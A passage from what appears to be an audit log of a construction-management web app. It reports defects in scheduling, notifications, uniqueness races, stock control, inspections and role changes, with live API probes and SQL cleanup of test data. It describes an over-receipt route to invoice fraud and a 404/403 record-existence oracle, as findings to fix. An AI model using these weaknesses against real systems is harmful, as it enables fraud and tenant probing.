author was working on, and the other writers of the same record were never revisited.* That is the
same shape as R2-326 (`invoice_type` partitioned six ways), R2-325 (`"Present"` counted two ways) and
R2-316 (`transfer` handled five ways — none of them right). **It is a codebase-wide habit rather than
eight separate oversights, and a sweep by *record* rather than by *screen* would close dozens of
findings at once.**

# 🔎 ROUND 6 — BATCH 20: to-dos, assignment and notification — nobody is ever told anything

Last of the unread write surface. Two findings, one of which closes a Round 5 open item without

## FINDING R2-383 — 🟠 HIGH: recurring to-dos never recur — `repeat_type` is stored and echoed, and no scheduler exists in the codebase

**Round 5 open item closed:** *"To-do recurrence — whether `repeat_type` generates anything needs a
scheduled-job window."* **No window is needed. Nothing generates anything, because there is no job
runner at all.**

`Todo.repeat_type` is `String(50), default "none"`, documented `# none, daily, weekly, monthly`
(`models.py:2102`). Every reference to it in the backend:

```
todos.py:49    "repeat_type": t.repeat_type,     # response serialisation
todos.py:66    repeat_type: str = "none"          # create schema
todos.py:76    repeat_type: Optional[str] = None  # update schema
todos.py:118   repeat_type=payload.repeat_type,   # stored on create
todos.py:144-145                                  # stored on update
```

Stored, echoed, never evaluated. And there is no machinery that could evaluate it: grepping
`requirements.txt` and `main.py` for `apscheduler`, `celery`, `cron` or FastAPI `BackgroundTasks`
returns nothing. The application is a request/response API with **no scheduled execution of any
kind**.

So a user setting a daily site check receives it once. The field is offered, accepted, persisted and
displayed back — the four behaviours that make a user believe a feature works — and the fifth,
producing the next to-do, does not exist.

This is the third dead feature of the round with the same signature: `refresh_vendor_performance`
(R2-338, function with no callers), `MusterRoll` (R2-333, table with no consumer), and now
`repeat_type` (column with no evaluator). **In each case the write path is complete and the read
path is absent**, which is why every one of them passes a click-through test.

**Note for anyone fixing it:** a scheduler is also the missing precondition for retention release
dates (R2-377), payment-request due dates, NCR due dates and drawing approvals ageing — the product
has **five** date-driven obligations and no clock.

---

## FINDING R2-384 — 🟠 HIGH: five kinds of assignment exist and nothing is ever sent to the person assigned

The schema assigns work in at least five places:

| Record | Column | Meaning |
|---|---|---|
| `Task` | `assigned_to` → `company_team.id` (`models.py:338`) | who does the work |
| `NCR` | `assigned_to` (`:862`) | who resolves the non-conformance |
| `CRMLead` | `assignee_id` (`:1043`) | who owns the lead |
| `DrawingPin` | `tagged_user_id` (`:391`) | who must look at this point on the drawing |
| `TeamScheduleAssignee` | `assignee_id` (`:2114`) | who is on the roster |

Plus `PaymentRequest` approvers and the `ApprovalRule.approvers` list (a comma-separated string of
emails, `models.py:1377`).

**No notification is emitted for any of them.** The only use of `app/mailer.py` in the entire
backend is `public_leads.py:152` — the marketing contact form emailing the founder. `auth.py` sends
email OTPs. There is no notification table, no in-app notification endpoint, no digest, no webhook,
and — per R2-383 — no scheduler that could send a reminder even if one were written.

So the assignment fields are pure data: a supervisor is assigned an NCR with a due date, and the only
way they discover it is by opening the NCR list and looking. `ApprovalRule.approvers` holds email
addresses **specifically so approvers can be reached**, and nothing reaches them — which is a
contributing reason why R2-342's one-click approval is the path everyone uses.

For a product whose value proposition is coordinating a construction site across office and field,
**the absence of any outbound signal is a product-level gap rather than a bug**, and it is worth
stating plainly in a document that otherwise counts defects: the workflow engine has no way to tell
anyone that they have work.

---

## FINDING R2-385 — 🟡 MEDIUM: two to-do systems, two completion vocabularies

`TaskTodo` (`models.py:1288-1295`) — sub-tasks inside a WBS task, completion modelled as
`is_completed = Boolean`, endpoints under `/planning/tasks/{id}/todos` with a `/toggle` route.

`Todo` (`models.py:2093-2107`) — company- or project-scoped to-dos with `due_date`, `repeat_type`,
`url`, `linked_task_id`, completion modelled as `status = String(50)` (`# pending, done`), endpoints
under `/todos`.

Both are live, both are reachable from the console, they model the same concept with different
completion semantics, and `Todo.linked_task_id` means a `Todo` can point at the same task a
`TaskTodo` belongs to — so one task can carry two independent to-do lists that neither knows about.
The `todo-report` slug in the catalogue is unimplemented (R2-075), so nothing reconciles them.

Sixth duplicate-model instance of the round, after `quotations` / `crm_quotations` (R2-361),
`transaction_retentions` / `transaction_deductions` (R2-378), `ProjectBudget` /
`LibraryCostCode.budget_amount` / `ProjectTower.budget` (R2-335, R2-375), `Task.status` /
`Task.progress` (R2-340), and `BankAccount` / `Payment.account_name` (R2-317).

# 🔎 ROUND 7 — BATCH 21: uniqueness — swept exhaustively, and the answer is smaller and sharper than expected

Round 6 closed with R2-358(b): `Equipment.code` is `unique=True` globally rather than per company,
which breaks the second customer to register a machine called `EX-01`. The obvious next question is
**how many other constraints have the same shape**. An AST sweep of every `unique=True` in
`models.py`, checked against whether the model is company- or project-scoped, answers it.

## Every unique constraint in the schema

| Model | Column | Scope of the row | Verdict |
|---|---|---|---|
| `Company` | `slug` | global | ✅ correct — slugs address companies |
| `User` | `email`, `mobile` | global | ✅ correct — identity is global |
| `CompanyPayrollSettings` | `company_id` | company | ✅ correct — one settings row per company |
| `CompanyTerms` | `company_id` | company | ✅ correct |
| `TallyConnection` | `company_id` | company | ✅ correct |
| `GoogleSheetsConnection` | `company_id` | company | ✅ correct |

## FINDING R2-386 — 🟠 HIGH: no document number in the product has a database uniqueness constraint, and the application checks that stand in for them are check-then-insert races across three instances

There is **not a single composite `UniqueConstraint`** anywhere in `models.py` — the AST sweep found
no `__table_args__` containing one. Every document number is therefore an ordinary
non-unique `String` column:

| Document number | DB constraint | Application check | Scope of the check |
|---|---|---|---|
| `Bill.invoice_number` | none | `billing.py:572-577` | company ✔ |
| `PurchaseOrder.po_number` | none | `procurement.py:406-411` | company ✔ |
| `GoodsReceiptNote.grn_number` | none | `procurement.py:548`, `:594` | company ✔ |
| `MaterialIndent.indent_number` | none | `procurement.py:281` | company ✔ |
| `WorkOrder.wo_number` | none | `billing.py:306` | company ✔ |
| `RFQ.rfq_number` | none | `rfq.py:105` | company ✔ |
| **`NCR.ncr_number`** | none | **none at all** | — |

Two distinct problems.

**(a) `ncr_number` is completely unguarded.** `raise_ncr` (`quality.py:313-323`) is
`NCR(**payload.model_dump())` with no duplicate check of any kind, and `ncr_number` is a required
caller-supplied `String(50)`. Two NCRs can carry the same number on the same project, which matters
because an NCR number is the reference quoted in correspondence with a subcontractor and on the
closure certificate.

**(b) The six that are checked are checked in the wrong place.** Each does
`SELECT … WHERE number = ?` and then `INSERT` in a later statement, with no unique index to catch the
collision. That is a textbook time-of-check-to-time-of-use race, and this deployment makes it a live
one rather than a theoretical one: **R2-311 established three Render instances**, so two users on two
instances submitting the same invoice number pass the check in parallel and both inserts succeed.
There is no `IntegrityError` to catch, because there is no constraint to violate.

The consequence is worse for invoices than the others. `Bill.invoice_number` is what the Tally export
keys vouchers on (`tally.py`), what Zoho de-duplicates on (**R2-368**, the live `code 13011`), and
what a customer quotes when paying. Two bills sharing a number produce two vouchers with the same
reference in the customer's statutory books.

**Fix:** add `UniqueConstraint(company_id, <number>)` to all seven tables, keep the application checks
for the friendly error message, and catch `IntegrityError` as the authoritative answer. Seven
constraints, one migration — and it is a precondition for R2-368's Zoho idempotency work, which
assumes bill numbers identify bills.

---

| # | Severity | One line |
|---|---|---|
| R2-386 | 🟠 | No document number has a DB uniqueness constraint; six rely on check-then-insert races across three instances, and `ncr_number` has no check at all |

# 🔎 ROUND 7 — BATCH 22: R2-374 and R2-375 proved live, to the rupee

Both were filed static in Batch 17. Both are now confirmed against the live backend on the **messy**
project `a1376092` (the clean room was not touched). Two probe towers were created, the two endpoints
read, and both towers deleted — `DELETE /towers/{id}` exists and works, so this test is fully
reversible and **no artefact remains**.

## The measurement

The project already carried one tower from Round 5 (`ZZ QA Tower A`). Two more were added —
`ZZ R7 Tower A` (budget ₹10,00,000) and `ZZ R7 Tower B` (budget ₹20,00,000) — deliberately with
*different* budgets, so any per-tower computation would have to differ.

`GET /towers/a1376092-…/consolidated-pnl`:

| tower | `total_po_value` | `total_billed` | `total_wo_value` | `budget` | `variance` |
|---|---|---|---|---|---|
| ZZ QA Tower A | **48,380.0** | **271,400.0** | **150,000.0** | 5,00,000 | 2,28,600 |
| ZZ R7 Tower A | **48,380.0** | **271,400.0** | **150,000.0** | 10,00,000 | 7,28,600 |
| ZZ R7 Tower B | **48,380.0** | **271,400.0** | **150,000.0** | 20,00,000 | 17,28,600 |

**Every cost figure is byte-identical across three towers.** Only `budget` — the one column read from
the tower row itself — differs.

**And `271,400.0` is exactly the figure Batch 2 measured for the whole project** from
`GET /billing/bills?project_id=a1376092-…`: `expense 5,900 + purchase 24,600 + subcon 111,100 +
payment_in 11,800 + sale 118,000 = 271,400`. So the "tower" column is provably the project's entire
billing, including its **sale invoice** and its **payment_in** document — the R2-326 partition defect
riding along inside the R2-374 one.

Summing the towers, which is the first thing anyone does with this table:

```
271,400 × 3 = 814,200   reported project cost
271,400                 actual project cost
```

**R2-374 confirmed.** Three-fold overstatement at three towers; N-fold at N.

## R2-375 confirmed in the same pass

`GET /budget/committed/a1376092-…/towers`:

| tower | `budget` | `committed` | `actual` | `variance` |
|---|---|---|---|---|
| ZZ QA Tower A | 5,00,000 | **5,00,000** | 2,71,400 | 2,28,600 |
| ZZ R7 Tower A | 10,00,000 | **10,00,000** | 2,71,400 | 7,28,600 |
| ZZ R7 Tower B | 20,00,000 | **20,00,000** | 2,71,400 | 17,28,600 |

`committed` equals `budget` on every row, for three different budget values — the tautology from
`budget.py:158` (`committed = float(t.budget)`), exactly as filed. A screen labelled
"Budget vs Committed" comparing a number against itself, on live data.

`actual` is again the project's whole billing on every row.

## Cleanup — complete, nothing left behind

```
POST   /towers/                          ×2   → 201
GET    /towers/{project}/consolidated-pnl     → the table above
GET    /budget/committed/{project}/towers     → the table above
DELETE /towers/2523f5b5-…                     → 204
DELETE /towers/9cdef2c7-…                     → 204
GET    /towers/{project}                      → only Round 5's ZZ QA Tower A remains ✅
```

**No SQL is needed for this batch.** Towers are one of the few records in the product with a working
delete route — worth noting against the forward-only pattern of Batch 14, where five other record
types have no reverse transition at all.

## Two operational notes for the founder

1. **Two `curl` calls returned code `000` (no response) and succeeded on retry** — one tower delete
   and one earlier equipment-deployment return. Both were slow-path first calls after an idle period.
   This is Render cold-start latency on the free/starter tier, **not** a product defect, and it is
   recorded so the next session does not mistake it for one. The same effect caused a 2-minute
   timeout on the first `/finance/pl` call in Batch 11 that returned in 7.4 s on retry.
2. `GET /towers/{project_id}/consolidated-pnl` on a project with **no** towers returns an empty body
   with **HTTP 000/no content** rather than the documented `"Overall Project"` row — the fallback
   branch at `towers.py:174-190` requires a `ProjectBudget` row to exist, and returns `[]` when there
   is none (`:190`). So a project with neither towers nor a budget silently returns nothing at all.
   Minor, and folded into R2-376 rather than filed separately.

# 🔎 ROUND 7 — BATCH 23: R2-348 proved live — and the over-receipt moves the three-way match's baseline with it

Filed static in Batch 9. Proved here against the **messy** project `a1376092`. The clean room was not
touched. Artefacts and the cleanup performed are at the end.

## The test

A purchase order for **100 tonne** at ₹1,000, then a goods receipt for **10,000 tonne** — one hundred
times the ordered quantity — against that PO's only line.

```
POST /procurement/pos    {"po_number":"ZZ-R7-PO-1", items:[{material:"ZZ R7 Steel Rod",
                          quantity:100, unit:"tonne", rate:1000, tax_pct:18}]}
  → 201  gross 100,000 · tax 18,000 · total 118,000 · status "draft"

POST /procurement/grns   {"po_id":"84136db0-…", items:[{po_item_id:"fed07517-…",
                          received_qty:10000}]}
  → 201  GRN-0002 created, no error, no warning
```

## What it did

| Check | Result |
|---|---|
| GRN accepted 100× the ordered quantity | ✅ **201 Created** — no cap, no tolerance, no warning |
| PO status afterwards | **`"received"`** — the `>=` at `procurement.py:694` treats an over-receipt as complete |
| PO's ordered quantity, for comparison | still `100.0` — the two numbers sit in the same response |
| `WarehouseInventory` | `received 10,000 · consumed 0 · current_stock 10,000` **tonne** of steel that was never ordered |

## The part that matters — the control follows the fraud

R2-348 predicted that because the three-way match derives its baseline from
`Σ received_qty × PO rate`, **over-receiving raises the expected invoice value.** Measured:

```
POST /three-way {"po_id":"84136db0-…", "grn_id":"91e05a9b-…", "invoiced_amount":118000}
→ po_amount        = 10,000,000.0      ← 10,000 tonne × ₹1,000
  grn_qty          = 10,000.0
  invoiced_amount  =    118,000.0      ← the TRUE value of the purchase order
  variance_amount  = -9,882,000.0
  match_status     = "pending"
```

**An honest invoice for the correct amount now reports a ₹98.82 lakh variance — in the direction that
reads as a massive *under*-bill.** The reconciliation says the vendor has billed ₹1,00,00,000 too
little. Symmetrically, an invoice of anything up to **₹1 crore** against this ₹1.18 lakh purchase
order would reconcile to a variance near zero and, once R2-241's dead classifier is repaired, would be
auto-classified `matched`.

So the sequence a fraudulent supplier needs is: over-state the receipt, then bill to the over-stated
figure. Both steps are ordinary product operations that return `201`, and the control specifically
built to catch the second one has had its baseline moved by the first.

**This raises R2-348 above its Batch 9 framing.** It is not only "stock goes wrong"; it is that
**the only quantity check in procurement takes its reference number from the only quantity the
product does not validate.**

---

## FINDING R2-387 — 🟠 HIGH: there is no way to correct a stock quantity in the product — the only route is to fabricate a consumption event

Discovered while cleaning up. `PATCH /procurement/inventory/{inventory_id}` looks like the stock
adjustment endpoint and is not:

```python
class InventoryPatchRequest(BaseModel):
    category: Optional[str] = None
    unit: Optional[str] = None            # ← the entire schema
```

```python
    if req.category is not None: inv.category = req.category
    if req.unit is not None:     inv.unit = req.unit      # procurement.py:889-892
```

Sending `{"on_hand_qty": 0}` returns **`200 OK` with `on_hand_qty: 10000.0` unchanged** — the field is
not in the schema, so FastAPI discards it and the endpoint reports success (Trap 2 of the audit
playbook, and a live demonstration of why that trap exists).

`WarehouseInventory.on_hand_qty` is written by exactly three paths: GRN receipt (+), the manual
transaction endpoint (±), and production consumption (−). **None of them is an adjustment.** There is
no write-off, no opening-balance correction, no physical-count reconciliation, and no negative-stock
repair — which is why R2-297's `ZZ Cement OPC53` has been sitting at **−9,699 tonne** since Round 5
with no supported way to fix it.

To neutralise the 10,000 phantom tonne created by this test, the only available move was to record a
**consumption that never happened**:

```
POST /procurement/transactions {"material_name":"ZZ R7 Steel Rod","qty":10000,"type":"used", …}
→ 201, stock: received 10,000 · consumed 10,000 · current_stock 0
```

Stock is now correct and **the consumption figures are permanently wrong** — 10,000 tonne of steel
recorded as used on a project that never used it. Those figures feed R2-329's analytics wastage
metric (`ordered − used`), R2-323's stock-movement report, and the production material report. The
only correction path the product offers **corrupts the reports that read consumption**.

This is the eleventh missing column of the audit in effect — not a column this time but a missing
*operation*: `type = "adjustment"` in `RECEIVED_TYPES | CONSUMED_TYPES` with a mandatory reason,
excluded from consumption analytics. Two lines in `procurement.py:193-194` plus a filter in the two
reports.

## FINDING R2-388 — 🟡 MEDIUM: existence is checked before permission, so an unauthorised user can enumerate which record ids exist

Two probes returned `404` where `403` was expected:

```
PATCH  /finance/approve/{a PO's uuid}                 → 404 "Transaction not found"
DELETE /finance/payments/00000000-0000-…-000000000000 → 404 "Payment not found"
```

Both endpoints load the row first and check the caller's rights afterwards
(`finance.py:470-486`, `:190-199`):

```python
def approve_transaction(transaction_id: uuid.UUID, …):
    bill = db.query(Bill).filter(Bill.id == transaction_id).first()
    if bill:
        get_company_membership(db, current_user, bill.company_id)      # ← permission AFTER the lookup
        require_permission(db, current_user, bill.company_id, "finance:approve")
        …
    payment = db.query(Payment).filter(Payment.id == transaction_id).first()
    if payment: …
    raise HTTPException(status_code=404, detail="Transaction not found")
```

So the response distinguishes three states to a caller who is authorised for none of them:

| Caller sends | Response | What it reveals |
|---|---|---|
| a uuid that is no bill or payment | `404` | the id does not exist |
| a bill/payment id in **another company** | `403` (from `get_company_membership`) | **the id exists, in a company you cannot see** |
| a bill/payment id in your company, without `finance:approve` | `403` | the id exists |

A Viewer — or a member of any other tenant — can therefore probe uuids and learn which ones are real
bills or payments, and the `404`/`403` split is a reliable oracle. Guessing a v4 uuid is infeasible,
so this is not a practical enumeration attack on its own; it becomes one when an id leaks by another
route (a shared PDF link, a screenshot, an exported CSV, R2-363's cross-tenant reference), letting the
holder confirm that the id is live and which tenant it belongs to.

**Round 5 praised this codebase for having no user enumeration in three separate auth endpoints**
(`password/forgot` returns a byte-identical response for known and unknown emails). The same
discipline is absent one module over: the finance endpoints answer "does this record exist" before
asking "may you touch it". **Check membership and permission first, and return `404` uniformly for
both "absent" and "not yours".**

## What Round 6 changed about the thesis

Round 5's thesis was *"numeric and enum validation is good, string validation is absent, relational
validation does not exist."* That held everywhere it was tested. Rounds 6–7 sharpen it into three
statements that predict where the next defect will be:

> **1. Where the product needs to identify a thing, it stores the thing's label instead of its id.**
> Parties (R2-314) · bank accounts (R2-317) · cost codes (R2-334) · materials (R2-323/330/336) ·
> labour roles (R2-332) · CRM sources, categories and statuses (R2-359). **In five of six the
> identifier already exists in the schema** — `CompanyTeam.id`, `BankAccount`, `LibraryCostCode`,
> `WarehouseInventory.id`, three CRM lookup tables. These scope as migrations plus a backfill.

> **2. A control is implemented once, on the screen its author was working on, and the other writers
> of the same record are never revisited.** `negative_stock_lock` guards procurement and not the DPR
> (R2-380) · the back-dating window covers bills and not payments (R2-381) · the edit window has one
> call site (R2-382) · `invoice_type` is partitioned six ways (R2-326) · `"Present"` is counted two
> ways (R2-325) · `transfer` is handled five ways, none correct (R2-316/344). **A sweep by *record*
> rather than by *screen* closes dozens of findings at once** and is a cheaper instruction than any
> list.

> **3. Where a column is missing, a feature was built on top of it anyway — and it returns confident
> wrong numbers rather than an empty state.** Tower P&L reports the project's cost once per tower
> (R2-374, proved: 3 towers × ₹2,71,400 identical) · the three-way match reconciles against a
> caller-typed amount (R2-349) · plant is billed at 24 h/day (R2-357, proved to the rupee) · the
> client PDF reports 0% completion for ever (R2-339). **An absent feature is honest; these are not.**

## FINDING R2-389 — 🔴 CRITICAL: the entire team-management module 500s on every company, because it reads a column that does not exist

The first call against the new company failed, and so does the same call against AK:

```
GET /apis/v3/settings/team/1fa705a4-…  (brand-new company) → 500 Internal Server Error
GET /apis/v3/settings/team/d3724ec3-…  (AK Construction)   → 500 Internal Server Error
```

`list_team_members` (`settings.py:508-536`):

```python
    rows = (db.query(CompanyTeam, User, CompanyRole)
              .join(User, User.id == CompanyTeam.user_id)
              .outerjoin(CompanyRole, CompanyRole.id == CompanyTeam.role_id)
              .filter(CompanyTeam.company_id == company_id).order_by(User.name).all())
    return [TeamMemberResponse(
                id=t.id, name=u.name, email=u.email,
                phone=u.phone,                      # ← :530
                role_id=t.role_id, role_name=r.role_name if r else None,
                priority_type=t.priority_type)
            for t, u, r in rows]
```

**`User` has no `phone` column.** The model defines `mobile` (`models.py:173`), with a comment
explaining the rename: *"Multi-provider auth: phone is no longer the sole identity… mobile is
nullable."* The rename reached the model and not this endpoint, so every call raises
`AttributeError: 'User' object has no attribute 'phone'` on the first row and returns 500.

### Consequences

- **Nobody can list their team.** Not on a new company, not on AK, not on any company — the failure is
  unconditional, not data-dependent.
- **`PUT /settings/team/{member_id}/role` is unreachable through the product**, because the only
  endpoint that yields a `member_id` is the one that crashes. Role assignment exists and cannot be
  invoked by a user of the console.
- **This is the exact mechanism behind R2-181** — *"no member-management path to recover"* — which
  has been recorded as a risk since Round 4 without a cause. The cause is one wrong attribute name.

### It is the fifth schema/model mismatch, so fix #6 is bigger than filed

| Site | Wrong reference | Kills |
|---|---|---|
| `finance.py:338`, `reports.py:649` | `StaffEmployee.company_user_id` | Party Ledger + salary rows (R2-236, R2-312) |
| `statutory` | `StatutoryReport.due_date` | every statutory filing (R2-283) |
| `face/summary`, `face/logs` | `FaceRecognitionLog.created_at` | face attendance reads (R2-307) |
| **`settings.py:530`** | **`User.phone`** | **all team management (this finding)** |

**Fix #6 in the handoff says "the 4 schema/model column mismatches". It is 5.** Every one is a
one-word change, and every one takes out a module — a `mypy`/SQLAlchemy attribute check in CI would
have caught all five before deploy, which is worth more than the individual fixes.

**Not on the Sentry board**, which carries 17 other issues — presumably because nobody has opened the
team screen recently. My two calls just added events; a board check now will show it.

## FINDING R2-390 — 🟠 HIGH: a role change commits and then returns 500, so a privilege change succeeds while telling the caller it failed

`PUT /settings/team/{member_id}/role` returns the same `TeamMemberResponse`, so it hits the same
missing attribute — **but only after the write is committed**. Measured on the throwaway company,
using a `member_id` obtained from `GET /crm/team-members/{cid}` (which works):

```
POST /settings/roles/{cid}  {"role_name":"ZZ R8 Powerless","permissions":{}}   → 201
PUT  /settings/team/2012981a-…/role  {"role_id":"0e3bce00-…"}                  → 500 Internal Server Error
GET  /auth/me                                                                  → role "ZZ R8 Powerless" ✅ committed
PUT  /settings/team/2012981a-…/role  {"role_id":"<Owner>"}                     → 500 Internal Server Error
GET  /auth/me                                                                  → role "Owner"          ✅ committed
```

**Both writes succeeded. Both reported failure.** A console user sees an error, retries, and each
retry silently re-applies the change. For a *permission* change specifically, this is the worst place
in the product for a false negative: an administrator who believes a role assignment failed may grant
it again by another route, or believe someone lacks access when they have it.

Same shape as R2-307 (face punch commits behind a 500) and the third instance overall of
**"the write lands, the response fails"** — a pattern worth its own regression test, because every
occurrence is invisible to the user and invisible to Sentry's error rate as a *data* problem.

---

## ✅ NEGATIVE RESULT — the owner CANNOT lock themselves out. R2-181 / R2-292 close as safe

The test that has been deferred for three rounds:

```
GET /auth/me  after self-assigning a role with permissions {}
→ role "ZZ R8 Powerless" · role_id 0e3bce00-… · priority_type "partner"
→ permissions: {"all": true}          ← still full access
```

`assign_member_role`'s docstring (`settings.py:546-551`) states the intent — *"Partners keep their
`priority_type` regardless of the chosen role, so this can never lock an owner out"* — and the
behaviour matches: with an **empty-permission role assigned to itself**, the owner membership still
resolves to `all: true` because `priority_type == "partner"` is evaluated ahead of the role's
permission map.

**So the feared scenario does not exist.** An owner can strip their own role to nothing and retains
full access. There is also no member-deletion endpoint at all (`/settings/team/{member_id}` exposes
only `PUT …/role`), so self-deletion is not reachable either.

This is a **deliberate protection that works**, and it belongs on the "places the product is right"
list — fifth entry, after the Gantt predecessor endpoint, the BOQ revision endpoint, the auth surface
and `_sequential_deduction_calc`.

The irony is worth recording: **the protection is sound and the screen that would exercise it has been
returning 500 since the `phone` → `mobile` rename.** The risk R2-181 described was real, and its
cause was never the permission model.

# 🔎 ROUND 8 — BATCH 26: R2-362 proved live — a failed inspection turned into a pass by answering one more question

Filed static in Batch 13 as the round's quality CRITICAL. Proved here on the **messy** project
`a1376092`. The clean room was not touched.

## The test

A six-item checklist, one inspection, and two ordinary submissions — the second of which is exactly
what a supervisor does when they finish an inspection the next morning.

```
POST  /quality/checklists                  {"title":"ZZ R8 Structural Checklist"}      → 201
POST  /quality/checklists/{cl}/items  ×6   {"description":"ZZ item N","is_mandatory":true} → 201 ×6
POST  /quality/inspections                 {"checklist_id":…, "zone":"ZZ R8 probe zone"} → 201
```

**Submission 1 — five items answered honestly: 1 Pass, 4 Fail.**

```
PATCH /quality/inspections/{id}/respond
      {"responses":[{item1:"Pass"},{item2:"Fail"},{item3:"Fail"},{item4:"Fail"},{item5:"Fail"}]}
→ 200  {"status":"partial", "pass_count":1, "fail_count":4, "na_count":0}
```

Correct. Four failures recorded, the inspection reads `partial`.

**Submission 2 — one further item answered, and it happens to pass.**

```
PATCH /quality/inspections/{id}/respond
      {"responses":[{item6:"Pass"}]}
→ 200  {"status":"pass", "pass_count":1, "fail_count":0, "na_count":0}
```

## The result

| | after submission 1 | after submission 2 |
|---|---|---|
| `status` | `partial` | **`pass`** |
| `pass_count` | 1 | **1** |
| `fail_count` | **4** | **0** |

**The four failures are gone from the summary.** They were never deleted — the loop upserts by
`checklist_item_id`, and submission 2 named a *different* item, so the four `Fail` rows in
`inspection_responses` are untouched. Only the summary was overwritten, from the payload, exactly as
`quality.py:291-302` does it.

Re-reading the inspection through `GET /quality/inspections/{project_id}` confirms the summary is
persisted, not a response artefact: `status "pass", pass_count 1, fail_count 0`.

**A quality-control record for physical construction work went from four recorded failures to "pass"
through an ordinary partial submission, with no warning, no history and no trace.** The operation
requires no intent — it is what the product does when an inspection is completed in two sittings.

---

## FINDING R2-391 — 🟠 HIGH: per-item inspection results cannot be read back through any endpoint, so the contradiction R2-362 creates is invisible

While verifying the four `Fail` rows survived, it emerged that **no endpoint returns them.** The
quality router exposes:

```
POST  /quality/inspections
PATCH /quality/inspections/{insp_id}/respond      ← writes responses
GET   /quality/inspections/{project_id}           ← returns InspectionResponse_ : summary counts only
```

`InspectionResponse_` (`quality.py:89-102`) carries `status`, `pass_count`, `fail_count`, `na_count`,
`zone`, `inspection_date` — **and no per-item detail.** `InspectionResponse` rows are write-only:
they are created and upserted by the `respond` endpoint and never served to any client.

Three consequences:

1. **R2-362 is undetectable from outside the database.** The summary says `0 fail`; the rows say
   `4 Fail`; nothing in the product can show the second number. A user cannot audit their own
   inspection.
2. **The `remarks` and `photo_url` captured per item are unreachable.** `ItemResponseCreate` accepts
   both (`quality.py:107-108`) and the model stores them (`models.py:846-847`), so photographic
   evidence of a defect is collected on site and can never be retrieved — the same shape as R2-330's
   write-only wastage log and R2-333's unreadable muster roll, and the **fourth** write-only record
   of the audit.
3. The `site-inspection` report slug in the catalogue is one of R2-075's unimplemented 58, so that
   route to the detail is closed too.

**Fix:** return the responses on `GET /quality/inspections/{project_id}` (or add
`GET /inspections/{insp_id}/responses`), and recount the summary from those rows rather than from the
payload — the same two-line change that closes R2-362.

---

No delete route exists for checklists, checklist items, inspections or inspection responses.

```sql

DELETE FROM site_inspections     WHERE id            = '422d1e0b-96a3-43c4-8160-121a6ac17152';
DELETE FROM checklist_items      WHERE checklist_id  = '7c8f3cd4-3473-498f-b7d2-f8a52c8c04b0';
DELETE FROM quality_checklists   WHERE id            = '7c8f3cd4-3473-498f-b7d2-f8a52c8c04b0';
```

### Write-only records — now four

| Record | Written by | Readable by | Finding |
|---|---|---|---|
| `MaterialWastage` | `POST /wastage` | its own list only; no consumer, no stock effect | R2-330 |
| `MusterRoll` | `POST /labour/muster-roll` | its own list only; the report slug is unimplemented | R2-333 |

| `InspectionResponse` | `PATCH …/respond` | **nothing** | **R2-391** |

Each was built as a data-capture feature, each accepts input and returns success, and in three of the
four the data cannot be retrieved by any means short of SQL. **This is the same "the write path is
complete and the read path is absent" signature as the three dead features in Batch 20** — and it is
now the most common structural defect in the product after the label-instead-of-id pattern.

# 🔎 ROUND 8 — BATCH 27: R2-380 proved live — the stock lock is on, and the DPR walks straight past it

Filed static in Batch 19. Proved on the **messy** project `a1376092`. The clean room was not touched.
`negative_stock_lock` was **enabled for the test and restored to `false` afterwards, verified by a
follow-up GET**.

## Setup

`GET /settings/company/{cid}` showed **all eight workflow controls off**, so the control was switched
on deliberately:

```
PUT /settings/company/d3724ec3-…  {"negative_stock_lock": true}   → 200
GET /settings/company/d3724ec3-…  → negative_stock_lock: true     ✅ armed
```

Then the same impossible operation was attempted through both endpoints that consume material —
500 `cft` of `ZZ R8 Phantom Sand`, a material with **no stock and no inventory row at all**.

## A) The guarded path — works exactly as designed

```
POST /procurement/transactions {"material_name":"ZZ R8 Phantom Sand","qty":500,"type":"used"}
→ 400 {"detail":"Restrict Material Usage: insufficient stock for 'ZZ R8 Phantom Sand'
        (available 0.0, requested 500.0)."}
```

Refused, with a precise message naming the control, the material and both quantities. This is
`enforce_stock_availability` doing its job, and it is why the setting appears to work when tested from
the procurement screen.

## B) The unguarded path — same material, same quantity, same second

```
POST /dpr {"dpr_date":"2026-07-27…","reported_by":"ZZ R8 probe","workers_deployed":1,
           "materials_consumed":[{"material_name":"ZZ R8 Phantom Sand","quantity":500,"unit":"cft"}]}
→ 201 Created
```

Resulting stock:

```
GET /procurement/stock?project_id=a1376092-…
→ {"material_name":"ZZ R8 Phantom Sand","unit":"cft",
   "received":0.0, "consumed":500.0, "current_stock":-500.0}
```

**Received 0. Consumed 500. Stock −500.** The inventory row did not exist before this call — the DPR
**created it at a negative quantity** (`dpr.py:118`, `on_hand_qty=-mat.quantity`), consuming into
existence a material the project has never received.

## Why this is the CRITICAL rather than a duplicate of R2-297

- The control was **explicitly enabled** by the company and the refusal message proves the server knew
  about it **one HTTP call earlier**.
- The bypass is not an edge case: `POST /dpr` is the daily progress report, the highest-volume write
  in the product and the one filled in by site staff rather than office staff.
- An administrator testing this control from the procurement screen sees a correct 400 and reasonably
  concludes the lock works.
- Combined with **R2-387** (no adjustment operation exists), the resulting −500 **cannot be corrected
  through the product** — which is why R2-297's `ZZ Cement OPC53` has sat at −9,699 since Round 5.

The four ways stock moves, measured end to end across this audit:

| Path | Guarded? | Effect |
|---|---|---|
| GRN receipt | ❌ no cap at all | **R2-348** — 100× over-receipt accepted, proved |
| Manual transaction | ✅ correctly | 400 with a clear message, proved above |
| DPR consumption | ❌ not checked | **R2-380** — creates negative rows, proved above |
| Wastage | — writes nothing | **R2-330** — stock never moves |

**One of four paths enforces the company's own setting.**

## Artefacts

```sql
-- Batch 27: R2-380 live proof. No delete route exists for DPRs (R2-266 noted the same).

DELETE FROM warehouse_inventory   WHERE id            = '4c84dcd5-d1e5-4c03-9671-3c388e67a4c5';  -- ZZ R8 Phantom Sand, at -500
```

`negative_stock_lock` is back to `false`, its original value, verified by GET. No other setting was
touched.

# 🔎 ROUND 8 — BATCH 28: R2-353 proved live, and R2-352 confirmed **with a correction to its wording**

Both filed static in Batch 10. Run against AK Construction (company-wide payroll, no project scope).
The clean room was not touched.

## R2-353 — the same payroll month, run twice, both finalized

```
POST /hr/payroll/run {"company_id":"d3724ec3-…","payroll_month":"2026-05","days_in_month":26}
→ run b793f6ad-… · status "finalized" · gross 46,800 · net 42,480 · 5 payslips

POST /hr/payroll/run {"company_id":"d3724ec3-…","payroll_month":"2026-05","days_in_month":26}   ← identical request
→ run 16e0ab95-… · status "finalized" · gross 46,800 · net 42,480 · 5 payslips
```

**Two finalized runs for the same month, with identical totals and ten `PayrollLineItem` rows where
there should be five.** No duplicate check, no warning, no constraint — exactly as filed. The company
